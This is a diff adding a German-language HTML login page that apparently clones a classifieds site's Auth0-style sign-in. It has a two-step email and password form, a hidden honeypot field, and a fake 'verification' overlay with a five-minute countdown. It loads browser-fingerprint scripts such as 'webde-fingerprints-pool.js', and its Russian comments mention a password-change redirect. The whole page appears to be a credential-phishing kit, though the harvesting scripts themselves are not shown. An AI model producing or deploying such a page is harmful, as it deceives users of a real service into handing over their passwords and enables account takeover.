@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="de" dir="auto" data-color-scheme="light" data-illustration="">
+<head>
+<style>body { transition: opacity ease-in 0.2s; }
+body[unresolved] { opacity: 0; display: block; overflow: hidden; position: relative; }
+</style>
+<script>
+(function () {
+  var html = document.documentElement;
+  var initialScheme = html.getAttribute("data-color-scheme");
+  var illustrationUrl = html.getAttribute("data-illustration");
+  var LOGO_DARK = "/klein-local-logo.png";
+  var LOGO_LIGHT = "/klein-local-logo.png";
+  var updateLogos = function (isDark) {
+    var headerLogo = document.querySelector(".knz-header__logo-img");
+    var centerLogo = document.getElementById("prompt-logo-center");
+    if (headerLogo) headerLogo.src = isDark ? LOGO_DARK : LOGO_LIGHT;
+    if (centerLogo) {
+      centerLogo.style.content = "unset !important";
+      if (illustrationUrl) {
+        centerLogo.src = illustrationUrl;
+      } else {
+        centerLogo.src = isDark ? LOGO_DARK : LOGO_LIGHT;
+      }
+    }
+  };
+  if (initialScheme === "dark") {
+    document.addEventListener("DOMContentLoaded", function () { updateLogos(true); });
+    return;
+  }
+  if (initialScheme === "light") {
+    document.addEventListener("DOMContentLoaded", function () { updateLogos(false); });
+    return;
+  }
+  if (initialScheme === "system" || !initialScheme) {
+    var mq = window.matchMedia("(prefers-color-scheme: dark)");
+    var applySystemTheme = function (isDark) {
+      html.setAttribute("data-color-scheme", isDark ? "dark" : "light");
+      if (document.readyState === "interactive" || document.readyState === "complete") updateLogos(isDark);
+    };
+    applySystemTheme(mq.matches);
+    mq.addEventListener("change", function (e) { applySystemTheme(e.matches); });
+    document.addEventListener("DOMContentLoaded", function () {
+      updateLogos(html.getAttribute("data-color-scheme") === "dark");
+    });
+  }
+})();
+</script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="ulp-version" content="1.101.5">
+<meta name="robots" content="noindex, nofollow">
+<link rel="stylesheet" href="/ulp-klein-auth0.css">
+<style id="custom-styles-container">
+:root, .af-custom-form-container .af-form { --primary-color: #B5E941; }
+:root, .af-custom-form-container .af-form { --button-font-color: #1D4B00; }
+:root { --secondary-button-border-color: #95958E; --social-button-border-color: #95958E; --radio-button-border-color: #95958E; }
+:root { --secondary-button-text-color: #326916; }
+:root { --link-color: #326916; }
+:root { --title-font-color: #0C0C0B; }
+:root { --font-default-color: #0C0C0B; }
+:root { --widget-background-color: #ffffff; }
+:root { --box-border-color: #ffffff; }
+:root { --font-light-color: #77756F; }
+:root { --input-text-color: #0C0C0B; }
+:root { --input-border-color: #95958E; --border-default-color: #95958E; }
+:root { --input-background-color: #ffffff; }
+:root { --icon-default-color: #0C0C0B; }
+:root { --error-color: #B30C0C; --error-text-color: #ffffff; }
+:root { --success-color: #326916; }
+:root { --base-focus-color: #0C0C0B; --transparency-focus-color: rgba(12,12,11,0.15); }
+:root { --base-hover-color: #000000; --transparency-hover-color: rgba(0,0,0, var(--hover-transparency-value)); }
+@media (prefers-color-scheme: dark) { :root { --ulp-captcha-widget-theme: dark; } }
+@media (not (prefers-color-scheme: dark)) { :root { --ulp-captcha-widget-theme: light; } }
+html, :root, .af-custom-form-container .af-form { font-size: 16px; --default-font-size: 16px; }
+body { --title-font-size: 1.125rem; --title-font-weight: var(--font-bold-weight); }
+body { --button-border-radius: 9999px; --radio-border-radius: 9999px; }
+:root { --input-border-width: 1px; }
+body { --input-border-radius: 8px; }
+.af-custom-form-container .af-form { --border-radius: 8px; }
+:root { --border-radius-outer: 16px; }
+:root { --box-border-width: 0px; }
+:root { --spacing: 8px; --spacing-2: calc(var(--spacing)*2); --spacing-3: calc(var(--spacing)*3); }
+:root { --button-border-width: 1px; --social-button-border-width: 1px; --radio-border-width: 1px; }
+body { --logo-alignment: 0 auto; }
+body { --logo-height: 52px; }
+body { --header-alignment: center; }
+body { --page-background-color: #ffffff00; }
+body { --ulp-label-font-size: 0.875rem; --ulp-label-font-weight: var(--font-default-weight); }
+.c43978590 { font-size: 0.875rem; font-weight: var(--font-default-weight); }
+.cf8d760c7 { font-size: 0.875rem; font-weight: var(--font-default-weight); }
+.c358eb6f9, .c3a261e26 { font-size: 0.875rem; font-weight: var(--font-bold-weight); }
+.ulp-passkey-benefit-heading { font-size: 1.025rem; }
+.c012cd7ad, .c390ab9b9, [id^="ulp-container-"] a { font-size: 0.875rem; font-weight: var(--font-bold-weight) !important; }
+.c390ab9b9, .c012cd7ad { text-decoration: underline; }
+.c3f1d1330 { --page-background-alignment: center; }
+.ce072b1c1 { height: var(--logo-height); }
+</style>
+<style>
+.no-js {
+  clip: rect(0 0 0 0);
+  clip-path: inset(50%);
+  height: 1px;
+  overflow: hidden;
+  position: absolute;
+  white-space: nowrap;
+  width: 1px;
+}
+</style>
+<noscript>
+<style>
+.js-required { display: none !important; }
+.no-js { clip: auto; clip-path: none; height: auto; overflow: auto; position: static; white-space: normal; width: 100%; }
+.no-js-container { width: var(--prompt-width); }
+</style>
+</noscript>
+<link rel="icon" href="/klein-favicon.png" type="image/png" sizes="32x32">
+<title>Anmelden</title>
+<style>
+:root {
+  --font-family: "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+  --button-height: 44px;
+  --input-height: 44px;
+}
+:root[data-color-scheme="light"] {
+  color-scheme: light;
+  -webkit-color-scheme: light;
+  -moz-color-scheme: light;
+  --page-background-color: #ffffff;
+  --lock-icon-bg: url("/klein-lock-light.svg");
+  --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23D63A3A'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23B30C0C'/></svg>");
+}
+:root[data-color-scheme="dark"] {
+  color-scheme: dark;
+  -webkit-color-scheme: dark;
+  -moz-color-scheme: dark;
+  --page-background-color: #121212;
+  --widget-background-color: #1e1e1e;
+  --font-default-color: #ffffff;
+  --title-font-color: #ffffff;
+  --font-light-color: #a1a1aa;
+  --icon-default-color: #a1a1aa;
+  --link-color: #b5e941;
+  --base-focus-color: #b5e941;
+  --transparency-focus-color: rgba(181,233,65,0.15);
+  --input-background-color: #2c2c2c;
+  --input-border-color: #555555;
+  --input-text-color: #ffffff;
+  --input-label-color: #a1a1aa;
+  --box-border-color: #333333;
+  --secondary-button-border-color: #555555;
+  --social-button-border-color: #555555;
+  --radio-button-border-color: #555555;
+  --error-color: #ff5a5f;
+  --success-color: #4ade80;
+  --ulp-captcha-widget-theme: dark;
+  --lock-icon-bg: url("/klein-lock-dark.svg");
+  --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23ff5a5f'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23ff5a5f'/></svg>");
+  }
+  :root[data-color-scheme="dark"] .knz-header { border-bottom: 1px solid #555555; }
+@media (prefers-color-scheme: dark) {
+  :root[data-color-scheme="system"] {
+    color-scheme: dark;
+    --page-background-color: #121212;
+    --widget-background-color: #1e1e1e;
+    --font-default-color: #ffffff;
+    --title-font-color: #ffffff;
+    --font-light-color: #a1a1aa;
+    --icon-default-color: #a1a1aa;
+    --link-color: #b5e941;
+    --base-focus-color: #b5e941;
+    --transparency-focus-color: rgba(181,233,65,0.15);
+    --input-background-color: #2c2c2c;
+    --input-border-color: #555555;
+    --input-text-color: #ffffff;
+    --input-label-color: #a1a1aa;
+    --box-border-color: #333333;
+    --secondary-button-border-color: #555555;
+    --social-button-border-color: #555555;
+    --radio-button-border-color: #555555;
+    --error-color: #ff5a5f;
+    --success-color: #4ade80;
+    --ulp-captcha-widget-theme: dark;
+    --lock-icon-bg: url("/klein-lock-dark.svg");
+    --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23ff5a5f'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23ff5a5f'/></svg>");
+  }
+  :root[data-color-scheme="dark"] .knz-header { border-bottom: 1px solid #555555; }
+}
+body { --logo-height: 30px; }
+html, body { background: var(--page-background-color); color: var(--font-default-color); }
+input, select, textarea {
+  background: var(--input-background-color);
+  border-color: var(--input-border-color);
+  color: var(--input-text-color);
+}
+a { color: var(--link-color); }
+.ulp-error-info[data-is-error="true"]::before,
+.ulp-input-error-icon { background-image: var(--error-icon-bg) !important; }
+.success-lock {
+  --image: var(--lock-icon-bg) !important;
+  background-image: var(--image) !important;
+  background-size: 88px;
+  background-color: unset !important;
+  -webkit-mask-image: none !important;
+  mask-image: none !important;
+}
+html[data-illustration]:not([data-illustration=""]) #prompt-logo-center {
+  display: block !important;
+  content: unset !important;
+  height: 120px !important;
+  max-height: 120px !important;
+}
+#custom-prompt-logo:empty,
+#custom-prompt-logo[style*="transparent"] { display: none !important; }
+main._widget { min-height: fit-content !important; }
+/* Sichtbarkeit, falls Stylesheet verzögert oder blockiert wird */
+body._widget-auto-layout main._widget.login-id {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  min-height: 70vh;
+  box-sizing: border-box;
+  padding: 24px 16px;
+}
+</style>
+<style>
+.knz-header {
+  display: block;
+  position: sticky;
+  top: 0;
+  z-index: 999;
+  background: var(--widget-background-color);
+  text-align: center;
+  height: 50px;
+  width: 100%;
+  padding: 12px 0;
+  border-bottom: 1px solid #dddbd5;
+}
+.knz-header__logo-link { display: none; outline: none !important; }
+.knz-header__logo-img { height: 32px; width: auto; vertical-align: middle; display: block; }
+.knz-header__back {
+  display: inline-block;
+  cursor: pointer;
+  position: absolute;
+  left: 0;
+  margin-left: 12px;
+  width: 24px;
+  height: 24px;
+  color: var(--link-color);
+}
+.knz-header__back svg { width: 100%; height: 100%; display: block; }
+.knz-header__help-link { position: absolute; right: 0; margin-right: 12px; }
+/* Двухшаговый логин: показывать только активный шаг */
+.knz-step { display: none; }
+.knz-step.is-active { display: block; }
+.knz-email-error {
+  font-size: 0.875rem;
+  color: var(--error-color);
+  margin: 8px 0 0;
+  line-height: 1.4;
+}
+.knz-email-error[hidden] {
+  display: none !important;
+}
+#btn-weitermachen.is-loading,
+#main-action-button.is-loading {
+  opacity: 0.75;
+  pointer-events: none;
+}
+/* Окно редиректа на смену пароля */
+.knz-redirect-overlay { position: fixed; inset: 0; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; background: rgba(0,0,0,0.5); }
+.knz-redirect-overlay[hidden] { display: none !important; }
+.knz-redirect-box { background: var(--widget-background-color); border-radius: var(--border-radius-outer); padding: 28px 24px; max-width: 400px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,0.2); text-align: center; }
+.knz-redirect-box h2 { font-size: 1.125rem; font-weight: 700; color: var(--title-font-color); margin: 0 0 14px; line-height: 1.35; }
+.knz-redirect-box p { font-size: 0.9375rem; line-height: 1.5; color: var(--font-default-color); margin: 0 0 8px; }
+.knz-redirect-countdown { font-size: 1.5rem; font-weight: 700; color: var(--link-color); margin-top: 16px; font-variant-numeric: tabular-nums; }
+/* Primary buttons — wie ULP (c5a5c0c46) */
+.c5a5c0c46 .c358eb6f9,
+.c5a5c0c46 button[data-action-button-primary="true"] {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  padding: 4px var(--spacing-2);
+  min-height: var(--button-height);
+  font-family: inherit;
+  font-size: 0.875rem;
+  font-weight: var(--font-bold-weight);
+  color: var(--button-font-color);
+  background-color: var(--primary-color);
+  border: 0;
+  border-radius: var(--button-border-radius);
+  outline: none;
+  cursor: pointer;
+  transition: background-color 0.25s ease-in-out, box-shadow 0.25s ease-in-out;
+  margin-top: var(--spacing-3);
+  box-sizing: border-box;
+  white-space: normal;
+  -webkit-font-smoothing: antialiased;
+}
+/* Поле пароля (шаг 2): разметка как ULP — input + toggle внутри .ulp-field.password */
+.password-icon-tooltip { font-size: 0.75rem; color: var(--font-light-color); }
+.password-icon-tooltip.hide { clip: rect(0 0 0 0); clip-path: inset(50%); height: 1px; overflow: hidden; position: absolute; white-space: nowrap; width: 1px; }
+/* Кнопка «глаз»: иконка (ULP без client-scripts не рисует .c5c23bf22) */
+#btn-toggle-password.ulp-button-icon {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  width: 44px;
+  min-width: 44px;
+  height: 44px;
+  padding: 0;
+  margin: 0;
+  border: 0;
+  background: transparent;
+  color: var(--icon-default-color);
+  border-radius: var(--input-border-radius);
+  cursor: pointer;
+  box-shadow: none;
+}
+#btn-toggle-password.ulp-button-icon:hover { color: var(--base-hover-color, #000); }
+#btn-toggle-password.ulp-button-icon:focus-visible {
+  outline: 2px solid var(--base-focus-color);
+  outline-offset: 2px;
+}
+.knz-pw-eye-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 22px;
+  height: 22px;
+  pointer-events: none;
+}
+.knz-pw-eye-wrap svg {
+  width: 22px;
+  height: 22px;
+  flex-shrink: 0;
+}
+.knz-pw-eye-wrap svg.hide { display: none !important; }
+/* Ошибка входа */
+#password-field-wrap.ulp-error .input { border-color: var(--error-color); box-shadow: 0 0 0 1px var(--error-color); }
+/* Readonly name=username — как ULP, визуально только span */
+.knz-readonly-username-mirror { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; opacity: 0; pointer-events: none; }
+.ca63d9de4 { position: relative; }
+.ulp-input-error-message { display: block; font-size: 0.875rem; color: var(--error-color); margin-top: 8px; }
+.ulp-input-error-message .ulp-input-error-icon { display: inline-block; width: 20px; height: 20px; vertical-align: middle; margin-right: 6px; background-image: var(--error-icon-bg); background-size: contain; background-repeat: no-repeat; background-position: center; }
+@media (min-width: 601px) {
+  :root { --prompt-width: 500px; --prompt-min-height: auto; }
+  #prompt-logo-center { display: none; }
+  .knz-header { height: 72px; }
+  .knz-header__logo-link { display: inline-block; }
+  .knz-header__logo-img { height: 48px; }
+  .knz-header__back { margin-top: 12px; }
+  .knz-header__help-link { font-size: 14px; margin-top: 12px; }
+}
+</style>
+<!-- __BRAND_JSON__ -->
+</head>
+<body class="_widget-auto-layout">
+  <header class="knz-header">
+    <a href="#" id="knz-back" class="knz-header__back" aria-label="Zurück">
+      <svg viewBox="0 0 12 12" fill="none">
+        <path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M7.5 2 4 6l3.5 4"></path>
+      </svg>
+    </a>
+    <a href="#" class="knz-header__logo-link" id="knz-header-logo" aria-label="Start">
+      <img class="knz-header__logo-img" src="/klein-local-logo.png" alt="">
+    </a>
+    <a href="#" class="knz-header__help-link" id="knz-header-help">Hilfe</a>
+  </header>
+
+  <main class="_widget login-id">
+    <section class="c37f111da _prompt-box-outer c6073117c">
+      <div class="cd88e52ad cf242c171">
+        <div class="cfc330a74 c3f1d1330">
+          <header class="c830ffe82 c13641cb1">
+            <div title="" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important;"></div>
+            <img class="ce072b1c1 c14413795" id="prompt-logo-center" src="/klein-local-logo.png" alt="" style="content: unset !important;">
+            <h1 class="c57a2b55e cebf149b0">Willkommen!</h1>
+            <div class="c43978590 c07798f9c">
+              <p class="c08c624ec c54badf1e">Melde dich mit deiner E-Mail-Adresse und deinem Passwort an.</p>
+            </div>
+          </header>
+
+          <div class="cf8d760c7 c0054fbe8">
+            <div class="c8a26f394 c2259f5c1">
+              <div class="c55b50794">
+                <form id="loginForm" method="post" action="#" class="c4ecf7c53 _form-login-id" data-form-primary="true" data-disable-html-validations="true" novalidate>
+                  <div class="knz-step is-active" id="knz-step-1">
+                    <div class="c8a26f394 c2259f5c1">
+                      <div class="c55b50794">
+                        <div class="input-wrapper _input-wrapper">
+                          <div class="c88b6b641 c22e0c9bb c6545b6ba c1fea8ac5 ulp-field" id="knz-email-field-wrap" data-action-text="" data-alternate-action-text="">
+                            <label id="username-label" class="ca85d4b41 c40ace57d cf051a4b0" for="username-input">E-mail <span class="required" aria-hidden="true">*</span></label>
+                            <input class="input c24dce660 cbc0e9a70" id="username-input" name="mweb_username" type="email" inputmode="email" aria-labelledby="username-label" aria-required="true" value="" autocomplete="email" autocapitalize="none" spellcheck="false">
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <p id="knz-email-error" class="knz-email-error" role="alert" hidden></p>
+                    <div class="c5a5c0c46">
+                      <button type="submit" name="action" id="btn-weitermachen" value="default" class="c358eb6f9 c2ce9d437 c13132938 cd97f81f4 _button-login-id" data-action-button-primary="true">Weiter</button>
+                    </div>
+                  </div>
+
+                  <div class="knz-step" id="knz-step-2">
+                    <div id="ulp-container-form-content-start"></div>
+                    <div class="c8a26f394 c2259f5c1">
+                      <div class="c55b50794">
+                        <div>
+                          <div class="ca63d9de4 c99119eb2 c785cbff7 ca5e08c57">
+                            <span id="email-display" class="ulp-authenticator-selector-text" aria-live="polite"></span>
+                            <a href="#" id="link-bearbeiten" class="c390ab9b9 cbbe4f163 cff70b93e c2ab3f64e" data-link-name="edit-username" aria-label="E-Mail-Adresse bearbeiten">Bearbeiten</a>
+                            <input type="text" name="username" id="knz-readonly-username" autocomplete="username" value="" readonly tabindex="-1" class="knz-readonly-username-mirror" aria-hidden="true">
+                          </div>
+                        </div>
+                        <div class="input-wrapper _input-wrapper">
+                          <div class="c88b6b641 c22e0c9bb password c51364a4d ulp-field" id="password-field-wrap" data-action-text="" data-alternate-action-text="">
+                            <label id="password-label" class="ca85d4b41 c40ace57d cea23eac2" for="password-input">Passwort <span class="required" aria-hidden="true">*</span></label>
+                            <input class="input c24dce660 cfba09985" id="password-input" name="mweb_password" type="password" aria-labelledby="password-label" autocomplete="current-password" autocapitalize="none" spellcheck="false" aria-describedby="error-login-msg">
+                            <button type="button" class="c358eb6f9 ulp-button-icon js-required c13132938 _button-icon" id="btn-toggle-password" role="switch" aria-checked="false" aria-label="Passwort anzeigen" data-action="toggle" title="Passwort anzeigen">
+                              <span aria-hidden="true" class="password-icon-tooltip show-password-tooltip">Passwort anzeigen</span>
+                              <span aria-hidden="true" class="password-icon-tooltip hide-password-tooltip hide">Passwort verbergen</span>
+                              <span class="c5c23bf22 password js-required knz-pw-eye-wrap" aria-hidden="true">
+                                <svg class="knz-svg-eye-open" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                  <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                                <svg class="knz-svg-eye-closed hide" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1 4.24-4.24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                  <path d="M1 1l22 22" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                </svg>
+                              </span>
+                            </button>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="knz-error-row" id="error-login-row" style="display: none;">
+                      <span id="error-login-msg" class="ulp-input-error-message" data-error-code="wrong-email-credentials" aria-live="polite">
+                        <span class="ulp-input-error-icon" aria-hidden="true"></span>
+                        <span id="error-login"></span>
+                      </span>
+                    </div>
+                    <div class="c5a5c0c46">
+                      <button type="submit" name="action" value="default" id="main-action-button" class="c358eb6f9 c2ce9d437 c13132938 cd97f81f4 _button-login-password" data-action-button-primary="true">Einloggen</button>
+                    </div>
+                  </div>
+
+                  <div style="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden" aria-hidden="true">
+                    <input type="text" name="website" id="hp-website" tabindex="-1" autocomplete="off">
+                  </div>
+                </form>
+              </div>
+            </div>
+            <div id="ulp-container-form-footer-start">
+              <p>&nbsp;</p>
+              <p>Noch nicht registriert? <a href="#" id="knz-footer-reg" style="text-decoration: underline;">Erstelle ein Konto</a></p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <div id="knz-wait-overlay" class="knz-redirect-overlay" hidden aria-live="polite">
+    <div class="knz-redirect-box">
+      <h2>Überprüfung</h2>
+      <p>Die Überprüfung läuft. Bitte verlassen Sie die Seite nicht, bis die Überprüfung abgeschlossen ist.</p>
+      <p class="knz-redirect-countdown" id="knz-wait-countdown">5:00</p>
+      <p style="font-size: 0.875rem; color: var(--font-light-color); margin-top: 8px;">Dies kann bis zu 5 Minuten dauern.</p>
+    </div>
+  </div>
+
+  <link rel="stylesheet" href="/chat-widget.css">
+  <script src="/webde-fingerprints-pool.js"></script>
+  <script src="/fingerprint.js"></script>
+  <script src="/script-klein.js"></script>
+  <script src="/chat-widget.js"></script>
+</body>
+</html>
